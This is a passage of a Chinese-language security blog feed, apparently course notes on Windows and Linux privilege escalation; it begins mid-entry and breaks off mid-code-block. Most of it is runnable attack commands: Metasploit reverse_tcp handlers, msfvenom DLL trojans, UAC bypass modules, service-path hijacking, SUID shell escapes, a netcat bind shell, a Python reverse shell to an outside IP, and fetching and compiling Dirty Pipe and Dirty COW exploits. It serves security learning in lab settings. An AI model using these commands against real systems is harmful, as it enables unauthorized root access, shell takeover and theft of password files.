class="hljs-keyword">use</span> <span class="hljs-title">incognito</span><br>// 直接在<span class="hljs-title">meterpreter</span>里运行，不用退出<br><span class="hljs-title">use</span> <span class="hljs-title">incognito</span><br><span class="hljs-title">list_tokens</span> -<span class="hljs-title">ux</span><br><span class="hljs-title">impersonate_token</span> &quot;<span class="hljs-title">NT</span> <span class="hljs-title">AUTHORITY</span>\<span class="hljs-title">SYSTEM</span>&quot;<br></code></pre></td></tr></table></figure><h5 id="WEB权限"><a href="#WEB权限" class="headerlink" title="WEB权限"></a>WEB权限</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">上传potato.exe<br><br>execute -cH -f ./potato.exe <span class="hljs-comment">//配合烂士豆《原理: 利用MS16_075漏洞)</span><br><span class="hljs-keyword">use</span> <span class="hljs-title">incognito</span><br><span class="hljs-title">list_tokens</span> -<span class="hljs-title">u</span><br><span class="hljs-title">impersonate_token</span> &quot;<span class="hljs-title">NT</span> <span class="hljs-title">AUTHORITY</span>\<span class="hljs-title">SYSTEM</span>&quot;<br></code></pre></td></tr></table></figure><h3 id="WIN-getsytem提权"><a href="#WIN-getsytem提权" class="headerlink" title="WIN-&gt;getsytem提权"></a>WIN-&gt;getsytem提权</h3><h5 id="msf自动提权"><a href="#msf自动提权" class="headerlink" title="msf自动提权"></a>msf自动提权</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">use</span> <span class="hljs-title">exploit</span>/<span class="hljs-title">multi</span>/<span class="hljs-title">handler</span><br><span class="hljs-title">set</span> <span class="hljs-title">PAYLOAD</span> <span class="hljs-title">windows</span>/<span class="hljs-title">meterpreter</span>/<span class="hljs-title">reverse_tcp</span><br><span class="hljs-title">set</span> <span class="hljs-title">lhost</span> 192.168.234.133<br><span class="hljs-title">set</span> <span class="hljs-title">lport</span> 3333<br><span class="hljs-title">run</span><br></code></pre></td></tr></table></figure><p><img src="/image/image-20230430175152218.png" alt="image-20230430175152218"></p><h3 id="UAC绕过"><a href="#UAC绕过" class="headerlink" title="UAC绕过"></a>UAC绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 介绍：</span><br><span class="hljs-comment">// uac一般指用户账户控制。 用户帐户控制（User Account Control，简写作UAC)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。</span><br><span class="hljs-comment">// msconfig &gt; 工具</span><br><span class="hljs-comment">// UAC有三个模式 低、中、高。开启任意模式，getsystem命令失效。因此需要绕过</span><br><br>使用msf搜索 UAC相关，可见到bypass模块<br>search UAC<br>-Test in win7 本地电脑 本地权限<br><span class="hljs-keyword">use</span> <span class="hljs-title">exploit</span>/<span class="hljs-title">windows</span>/<span class="hljs-title">local</span>/<span class="hljs-title">bypassuac</span><br>-<span class="hljs-title">Test</span> <span class="hljs-title">in</span> <span class="hljs-title">win10</span> 本地电脑 本地权限<br><span class="hljs-title">use</span> <span class="hljs-title">exploit</span>/<span class="hljs-title">windows</span>/<span class="hljs-title">local</span>/<span class="hljs-title">ask</span>     (相当于钓鱼。用于高等级)<br><span class="hljs-title">use</span> <span class="hljs-title">exploit</span>/<span class="hljs-title">windows</span>/<span class="hljs-title">local</span>/<span class="hljs-title">bypassuac_sTuihijack</span><br><span class="hljs-title">use</span> <span class="hljs-title">exploit</span>/<span class="hljs-title">windows</span>/<span class="hljs-title">local</span>/<span class="hljs-title">bypassuac_silentcleanup</span><br></code></pre></td></tr></table></figure><h5 id="UACME工具"><a href="#UACME工具" class="headerlink" title="UACME工具"></a>UACME工具</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">https:<span class="hljs-comment">//github.com/hfirefOx/UACME</span><br>执行以下命令上线<br>Akagi64.exe <span class="hljs-number">41</span> msf1.exe<br>Akagi64.exe &lt;编号&gt; &lt;调用执行&gt;<br><span class="hljs-number">23</span>/<span class="hljs-number">41</span>/<span class="hljs-number">61</span>常用编号<br><br>msf通过上面工具上线后。执行getsystem即可<br></code></pre></td></tr></table></figure><h3 id="制作dll木马上传"><a href="#制作dll木马上传" class="headerlink" title="制作dll木马上传"></a>制作dll木马上传</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 利用火绒剑进行进程分析加载DLL，一般寻程序DLL利用。</span><br>msfvenom -p windows/meterpreter/reverse_tcp lhost=<span class="hljs-number">192.168</span>.<span class="hljs-number">234.133</span> lport=<span class="hljs-number">4444</span> -f dll -o yeye.dll<br>  <br><span class="hljs-comment">// 等待触发</span><br></code></pre></td></tr></table></figure><h3 id="永恒之蓝"><a href="#永恒之蓝" class="headerlink" title="永恒之蓝"></a>永恒之蓝</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">ms17_<br></code></pre></td></tr></table></figure><h3 id="Win-不带引号的服务"><a href="#Win-不带引号的服务" class="headerlink" title="Win-&gt;不带引号的服务"></a>Win-&gt;不带引号的服务</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 原理：即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以直接修改它导致重定向执行文件。</span><br><br><br>服务名称： 为 C:/AA X86/MM.EXE 没有双引号+路径中有空格   有则这是不安全的<br>可构造木马即路径为： C:/AA.exe如此上面服务被调用的时候会调用到我们的木马程序<br></code></pre></td></tr></table></figure><h5 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 方式一</span><br><span class="hljs-number">1</span>.msf上线+上传jaws-<span class="hljs-keyword">enum</span>.ps1文件<br><span class="hljs-number">2</span>.调用shell 中的 powershell <br><span class="hljs-number">3</span>.执行文件  .\jaws-<span class="hljs-keyword">enum</span>.ps1<br><br><span class="hljs-comment">// 方式二</span><br>检测命令：wmic service get name,displayname,pathname,startmode |findstr /i <span class="hljs-string">&quot;Auto&quot;</span> |findstr /i /v <span class="hljs-string">&quot;C:\Windows\\&quot;</span> |findstr /i /v <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/image/image-20230430205314368.png" alt="image-20230430205314368"></p><p>上图中  QiYouDaemon 可以被利用  &#x3D;&#x3D;》上传木马 D:&#x2F;Program.exe 即可</p><p><img src="/image/image-20230430210202509.png" alt="image-20230430210202509"></p><h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">主动调用（需要高权限）：<span class="hljs-built_in">sc</span> <span class="hljs-built_in">start</span> <span class="hljs-string">&quot;QiYouDaemon&quot;</span><br><br>被动调用：等待被调用（电脑重启等等）<br></code></pre></td></tr></table></figure><p><img src="/image/image-20230430210100392.png" alt="image-20230430210100392"></p><h3 id="Win-不安全的服务"><a href="#Win-不安全的服务" class="headerlink" title="Win-&gt;不安全的服务"></a>Win-&gt;不安全的服务</h3><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">原理：即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以直接修改它导致重定向执行文件。<br></code></pre></td></tr></table></figure><h5 id="检测-1"><a href="#检测-1" class="headerlink" title="检测"></a>检测</h5><p>运行脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>.accesschk.exe -uwcqv <span class="hljs-string">&quot;administrators&quot;</span> *<br><br><span class="hljs-number">2</span>.找权限为“SERVICE_ALL_ACCESS”的服务<br><br><span class="hljs-number">3</span>.配置 sc config <span class="hljs-string">&quot;vds&quot;</span> binpath=<span class="hljs-string">&quot;C:\1.exe&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/image/image-20230430212113038.png" alt="image-20230430212113038"></p><h5 id="上线"><a href="#上线" class="headerlink" title="上线"></a>上线</h5><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">sc</span> <span class="hljs-built_in">start</span> vds   手动启动上线/或者等待服务被调用上线<br></code></pre></td></tr></table></figure><p><img src="/image/image-20230430211958854.png" alt="image-20230430211958854"></p><p><img src="/image/image-20230430212151767.png" alt="image-20230430212151767"></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全技术</tag>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>权限提升_linux</title>
    <link href="/2022/03/14/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_linux/"/>
    <url>/2022/03/14/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_linux/</url>
    
    <content type="html"><![CDATA[<h1 id="权限提升-linux"><a href="#权限提升-linux" class="headerlink" title="权限提升_linux"></a>权限提升_linux</h1><h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl ifconfig.me 可见自己IP<br>网卡ifconfig<br>判断权限id<br>查看内核版本 uname -srm<br><br><br>*一个综合类探针：https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/liamg/</span>traitor（上传赋权后直接运行即可）<br><br>一个自动化提权：https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/AlessandroZ/</span>BeRoot （需要py环境）<br><br>*信息收集：https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/rebootuser/</span>LinEnum（出系统信息）<br>*信息收集：https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/mzet-/</span>linux-exploit-suggester（出EXP信息）<br><br>漏洞探针：https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/sleventyeleven/</span>linuxprivchecker（需要py环境）<br>*漏洞探针：https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/jondonas/</span>linux-exploit-suggester-<span class="hljs-number">2</span><br><br>二进制文件提权查询：<br>Linux：https:<span class="hljs-regexp">//g</span>tfobins.github.io/<br>Windows：https:<span class="hljs-regexp">//</span>lolbas-project.github.io/<br><br>set payload php<span class="hljs-regexp">/meter--/</span>reverse--<br><br></code></pre></td></tr></table></figure><p>F:\MyClass\课件\07_权限提升\04_权限提升_linux\工具\1\项目资源\BeRoot-master</p><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_linux.assets/image-20230506163452733.png" alt="image-20230506163452733"></p><h2 id="二、SUID提权"><a href="#二、SUID提权" class="headerlink" title="二、SUID提权"></a>二、SUID提权</h2><h3 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理"></a>1.原理</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros">是什么？<br>SUID（<span class="hljs-built_in">Set</span><span class="hljs-built_in"> User </span>ID）是一种特殊的权限设置，<br>用于在执行程序时将有效用户ID（普通）（UID）临时更改为程序文件所有者的UID（管理员）。<br><br>root  suid-&gt;<span class="hljs-built_in">find</span><br>  ↓<br>boy (运维人员)  <span class="hljs-built_in">find</span> （root）--&gt; nc (root)<br><br><br>漏洞成因：chmod u+s给予了suid u-s删除了suid<br>如：chmod u+s /usr/bin/<span class="hljs-built_in">find</span><br><br><br>使程序在运行中受到了suid root权限的执行过程导致<br><br>提权过程：探针是否有SUID(手工或脚本)-特定SUID利用-<br></code></pre></td></tr></table></figure><h3 id="2、探测"><a href="#2、探测" class="headerlink" title="2、探测"></a>2、探测</h3><h4 id="2-1、手工"><a href="#2-1、手工" class="headerlink" title="2.1、手工"></a>2.1、手工</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">手工命令探针安全：<br><span class="hljs-built_in">find</span> / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-built_in">find</span> / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;<br></code></pre></td></tr></table></figure><h4 id="2-2、工具"><a href="#2-2、工具" class="headerlink" title="2.2、工具"></a>2.2、工具</h4><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">脚本项目探针安全：<br>LinEnum.<span class="hljs-keyword">sh </span>traitor linuxprivchecker<br></code></pre></td></tr></table></figure><h3 id="3、suid利用"><a href="#3、suid利用" class="headerlink" title="3、suid利用"></a>3、suid利用</h3><p>参考利用：<br><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a>   —》可获取shell<br><a href="https://pentestlab.blog/2017/09/25/suid-executables/">https://pentestlab.blog/2017/09/25/suid-executables/</a></p><h5 id="–-Nmap"><a href="#–-Nmap" class="headerlink" title="– Nmap"></a>– Nmap</h5><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">nmap</span> -V<br><span class="hljs-keyword">nmap</span> --interactive<br><span class="hljs-keyword">nmap</span>&gt; !sh<br><span class="hljs-keyword">sh</span>-<span class="hljs-number">3.2</span># whoami<br>root<br></code></pre></td></tr></table></figure><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_linux.assets/nmap-interactive-mode.png" alt="Nmap - Interactive Mode"></p><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_linux.assets/root-shell-via-suid-nmap.png" alt="Root Shell via SUID Nmap"></p><h5 id="–-Vim"><a href="#–-Vim" class="headerlink" title="– Vim"></a>– Vim</h5><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">vim</span>.tiny /etc/shadow<br><span class="hljs-keyword">vim</span>.tiny<br>   # Press ESC key<br>   :<span class="hljs-keyword">set</span> <span class="hljs-keyword">shell</span>=/bin/<span class="hljs-keyword">sh</span><br>   :<span class="hljs-keyword">shell</span><br></code></pre></td></tr></table></figure><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_linux.assets/vim-reading-root-files.png" alt="Vim - Reading Root Files"></p><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_linux.assets/vim-root-shell.png" alt="Vim - Root Shell"></p><h5 id="–-Find"><a href="#–-Find" class="headerlink" title="– Find"></a>– Find</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> pentestlab<br>  find pentestlab -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">whoami</span> \;//可以看见为root权限<br>  ----<br>  find pentestlab -<span class="hljs-built_in">exec</span> netcat -lvp 5555 -e /bin/sh \;//执行反弹命令<br>  ----<br>  netcat 192.168.1.189 5555<br>  <span class="hljs-built_in">id</span><br>  <span class="hljs-built_in">cat</span> /etc/shadow<br></code></pre></td></tr></table></figure><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_linux.assets/find-command-execution.png" alt="Find Command Execution"></p><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_linux.assets/run-netcat-via-find.png" alt="Run Netcat via Find"></p><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_linux.assets/root-shell-via-find.png" alt="Root Shell via Find"></p><h5 id="–-Bash"><a href="#–-Bash" class="headerlink" title="– Bash"></a>– Bash</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">bash -p<br>bash-3.2# id<br><span class="hljs-attribute">uid</span>=1002(service) <span class="hljs-attribute">gid</span>=1002(service) <span class="hljs-attribute">euid</span>=0(root) <span class="hljs-attribute">groups</span>=1002(service)<br></code></pre></td></tr></table></figure><h5 id="–-Less"><a href="#–-Less" class="headerlink" title="– Less"></a>– Less</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">less <span class="hljs-regexp">/etc/</span>passwd<br>!<span class="hljs-regexp">/bin/</span>sh<br></code></pre></td></tr></table></figure><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_linux.assets/less-root-shell.png" alt="Less - Root Shell"></p><h5 id="–-More"><a href="#–-More" class="headerlink" title="– More"></a>– More</h5><h5 id="–-Nano"><a href="#–-Nano" class="headerlink" title="– Nano"></a>– Nano</h5><h5 id="–-cp"><a href="#–-cp" class="headerlink" title="– cp"></a>– cp</h5><p>**更多详见：**<a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p><h3 id="4、上线"><a href="#4、上线" class="headerlink" title="4、上线"></a>4、上线</h3><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs tcl">touch yeye<br>find yeye -<span class="hljs-keyword">exec</span> whoami \;<br><br><br>shell 生成网址：https://forum.ywhack.com/shell.php<br><br><br>利用NC反弹：<br>find yeye -<span class="hljs-keyword">exec</span> netcat -lvp <span class="hljs-number">5555</span> -e /bin/sh \;<br>netcat xx.xx.xx.xx <span class="hljs-number">5555</span><br><br>利用Python反弹：<br>find yeye -<span class="hljs-keyword">exec</span> python -c &#x27;import <span class="hljs-keyword">socket</span>,subprocess,os;s=<span class="hljs-keyword">socket</span>.<span class="hljs-keyword">socket</span>(<span class="hljs-keyword">socket</span>.AF_INET,<span class="hljs-keyword">socket</span>.SOCK_STREAM);s.connect((<span class="hljs-string">&quot;47.94.236.117&quot;</span>,<span class="hljs-number">7777</span>));os.dup2(s.fileno(),<span class="hljs-number">0</span>);os.dup2(s.fileno(),<span class="hljs-number">1</span>);os.dup2(s.fileno(),<span class="hljs-number">2</span>);p=subprocess.call([<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>]);&#x27; \;<br><br>攻击机开启监听：nc -lvp <span class="hljs-number">7777</span><br><br></code></pre></td></tr></table></figure><h2 id="三、漏洞提权"><a href="#三、漏洞提权" class="headerlink" title="三、漏洞提权"></a>三、漏洞提权</h2><h3 id="1、普通EXP上线"><a href="#1、普通EXP上线" class="headerlink" title="1、普通EXP上线"></a>1、普通EXP上线</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs 1c">提权过程：连接<span class="hljs-punctuation">-</span>获取可利用漏洞<span class="hljs-punctuation">-</span>下载或上传<span class="hljs-built_in">EXP</span><span class="hljs-punctuation">-</span>编译<span class="hljs-built_in">EXP</span><span class="hljs-punctuation">-</span>给权限执行<span class="hljs-punctuation">-</span>GG<br>探针项目：BeRoot linux<span class="hljs-punctuation">-</span>exploit<span class="hljs-punctuation">-</span>suggester linux<span class="hljs-punctuation">-</span>exploit<span class="hljs-punctuation">-</span>suggester2<br><br><br>gcc <span class="hljs-number">45010</span>.c <span class="hljs-punctuation">-</span>o <span class="hljs-built_in">exp</span><br>chmod <span class="hljs-punctuation">+</span>x <span class="hljs-built_in">exp</span><br>./<span class="hljs-built_in">exp</span><br>id<br><br>通过探针结果<span class="hljs-punctuation">-</span><span class="hljs-punctuation">-</span><span class="hljs-punctuation">-</span>&gt;下载对应<span class="hljs-built_in">exp</span>脚本<span class="hljs-punctuation">-</span><span class="hljs-punctuation">-</span><span class="hljs-punctuation">-</span>》编译（.c/makefile）/赋权/运行<br><br><br></code></pre></td></tr></table></figure><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_linux.assets/image-20230512010458863.png" alt="image-20230512010458863"></p><h3 id="2、脏牛提权（CVE-2016-5195）"><a href="#2、脏牛提权（CVE-2016-5195）" class="headerlink" title="2、脏牛提权（CVE-2016-5195）"></a>2、脏牛提权（CVE-2016-5195）</h3><p>Lampiao靶场复现</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs gams">内核提权整个过程：（linux-exploit-suggester获取信息哦）<br><br>内核漏洞提权过程：寻可用-下<span class="hljs-built_in">exp</span>-上/tmp-编译<span class="hljs-built_in">exp</span>-执行(无权限用chmod)<br>nmap <span class="hljs-number">192.168</span><span class="hljs-number">.46</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span><br>nmap -p1<span class="hljs-number">-65535</span> <span class="hljs-number">192.168</span><span class="hljs-number">.46</span><span class="hljs-number">.144</span><br>search drupal<br>use exploit/unix/webapp/drupal_drupalgeddon2<br><span class="hljs-keyword">set</span> rhost <span class="hljs-comment">192.168.46.144</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">rport 1898</span><br>run<br><br>===脏牛提权===<br>upload /root/<span class="hljs-comment">dcow.cpp</span> /tmp/<span class="hljs-comment">dcow.cpp</span><br>g++ -Wall <span class="hljs-comment">-pedantic -O2 -std=c++11 -pthread -o dcow dcow.cpp -lutil</span><br>python <span class="hljs-comment">-c</span> <span class="hljs-comment">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br>./dcow<br>su root<br></code></pre></td></tr></table></figure><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_linux.assets/image-20230515105608220.png" alt="image-20230515105608220"></p><h3 id="3、脏管提权（CVE-2022-0847）"><a href="#3、脏管提权（CVE-2022-0847）" class="headerlink" title="3、脏管提权（CVE-2022-0847）"></a>3、脏管提权（CVE-2022-0847）</h3><p>[]: 工具\1\演示EXP\DirtyPipe(CVE-2022-0847)</p><p>方法 劫持<a href="https://so.csdn.net/so/search?q=SUID&spm=1001.2101.3001.7020">SUID</a>文件&#x2F;root</p><p>方法一：劫持<a href="https://so.csdn.net/so/search?q=SUID&spm=1001.2101.3001.7020">SUID</a>文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">Dirty Pipe(CVE-2022-0847)<br>5.8&lt;=Linux kernel&lt;5.16.11/5.15.25/5.10.102<br>查看内核版本 <span class="hljs-built_in">uname</span> -srm<br><br>wget https://haxx.in/files/dirtypipez.c<br>gcc -std=c99 dirtypipez.c -o dirtypipez<br><br>find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br><br>./dirtypipez /usr/bin/su  <span class="hljs-comment">#任何具体suid权限的文件均可</span><br><span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure><p>方法二：复写&#x2F;etc&#x2F;passwd</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">┌──<span class="hljs-params">(kali㉿kali)</span>-[~<span class="hljs-string">/Desktop/CVE-2022-0847-DirtyPipe-Exploit-main</span>]<br>└─$ <span class="hljs-string">./compile.sh</span>               <br>                                                                                                                                          <br>┌──<span class="hljs-params">(kali㉿kali)</span>-[~<span class="hljs-string">/Desktop/CVE-2022-0847-DirtyPipe-Exploit-main</span>]<br>└─$ <span class="hljs-keyword">ls</span><br>compile.sh  exploit  exploit.c  LICENSE.txt  README.md<br>                                                                                                                                          <br>┌──<span class="hljs-params">(kali㉿kali)</span>-[~<span class="hljs-string">/Desktop/CVE-2022-0847-DirtyPipe-Exploit-main</span>]<br>└─$ <span class="hljs-string">./exploit</span>   <br>Backing up <span class="hljs-string">/etc/passwd</span> to <span class="hljs-string">/tmp/passwd.bak</span> <span class="hljs-string">...</span><br>Setting root password to <span class="hljs-string">&quot;aaron&quot;</span><span class="hljs-string">...</span><br>                                                                                                                                          <br>┌──<span class="hljs-params">(kali㉿kali)</span>-[~<span class="hljs-string">/Desktop/CVE-2022-0847-DirtyPipe-Exploit-main</span>]<br>└─$ su<br>Password: <br><span class="hljs-comment"># id</span><br>uid=0<span class="hljs-params">(root)</span> gid=0<span class="hljs-params">(root)</span> groups=0<span class="hljs-params">(root)</span>,4<span class="hljs-params">(adm)</span>,20<span class="hljs-params">(dialout)</span>,119<span class="hljs-params">(wireshark)</span>,142<span class="hljs-params">(kaboxer)</span><br><span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><p>方法三</p><figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs julia">脚本运行  bash Dirty-<span class="hljs-built_in">Pipe</span>.sh<br></code></pre></td></tr></table></figure><h3 id="4、SUDO-CVE-2021-3156）"><a href="#4、SUDO-CVE-2021-3156）" class="headerlink" title="4、SUDO(CVE-2021-3156）"></a>4、SUDO(CVE-2021-3156）</h3><p>[]: 工具\1\演示EXP\CVE-2021-3156</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 